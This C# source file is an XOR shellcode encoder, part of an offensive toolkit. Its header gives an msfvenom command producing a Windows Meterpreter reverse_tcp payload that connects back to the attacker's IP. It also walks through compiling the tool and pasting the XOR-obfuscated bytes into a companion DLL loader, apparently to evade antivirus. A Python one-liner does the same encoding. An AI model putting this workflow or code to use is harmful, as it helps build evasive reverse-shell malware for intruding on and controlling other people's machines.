// ================================================================
// DLL_Xor.cs — XOR Shellcode Encoder (Run on Your Attack Machine)
// ================================================================
// WHAT THIS DOES:
//   A standalone C# utility that XOR-encodes a raw shellcode byte array
//   with key 0xAA and prints the result as a C# hex array to stdout.
//   The encoded output is what you paste into DLL_Runner.cs (the buf[] array).
//   This is NOT the loader itself — it is only a helper encoder tool.
//
//   Workflow:
//     1. Paste your raw msfvenom shellcode into buf[] in this file
//     2. Compile and run this tool on your Windows attack machine
//     3. Copy the printed output (0xXX,0xXX,...) into DLL_Runner.cs's buf[]
//     4. Compile DLL_Runner.cs as a DLL
//
// ----------------------------------------------------------------
// BEFORE YOU USE THIS — PASTE YOUR SHELLCODE
// ----------------------------------------------------------------
//   Replace the buf = new byte[689] {...} array below with your RAW
//   msfvenom shellcode (NOT already XOR-encoded):
//
//   On Kali, generate raw shellcode:
//     msfvenom -p windows/x64/meterpreter/reverse_tcp \
//       LHOST=<YOUR_IP> LPORT=443 EXITFUNC=thread -f csharp
//   Copy the byte array output and paste it into buf[] below.
//
// ----------------------------------------------------------------
// COMPILE (on Windows attack machine or Kali with mono)
// ----------------------------------------------------------------
//
//   OPTION A — Windows command line:
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:DLL_Xor.exe DLL_Xor.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework)
//     2. Any name, Framework 4.x, click Create
//     3. Delete Program.cs contents, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Run: bin\Debug\DLL_Xor.exe (or press F5 in VS)
//
//   OPTION C — Kali with mono:
//     mcs -out:DLL_Xor.exe DLL_Xor.cs
//     mono DLL_Xor.exe
//
// ----------------------------------------------------------------
// RUN
// ----------------------------------------------------------------
//   .\DLL_Xor.exe
//
//   Output looks like:
//     The payload is: 0x56,0xe2,0x29,...
//
//   Copy the hex bytes (everything after "The payload is: ")
//   and paste them into the buf[] array in DLL_Runner.cs.
//
// ----------------------------------------------------------------
// ALTERNATIVE: XOR ENCODE ON KALI WITHOUT COMPILING
// ----------------------------------------------------------------
//   python3 -c "
//   data=open('shell.bin','rb').read()
//   enc=bytes(b^0xAA for b in data)
//   print(','.join(f'0x{b:02x}' for b in enc))
//   "
//
// BEFORE USING, CHANGE:
//   - buf[] array -> your raw (un-encoded) msfvenom shellcode
// ================================================================
using System;
using System.Text;

namespace XOR_encoder
{
    class Program
    {
        static void Main(string[] args)
        {
            // Msfvenom shellcode here
            byte[] buf = new byte[689] {
 };

            // Array holding encrypted shellcode
            byte[] encoded =  new byte[buf.Length];

            // loop to iterate the bytes and XOR
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            //Convert the byte array to a string
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                // 0: hex format, x2 indicates 2 bytes
                hex.AppendFormat("0x{0:x2},", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}

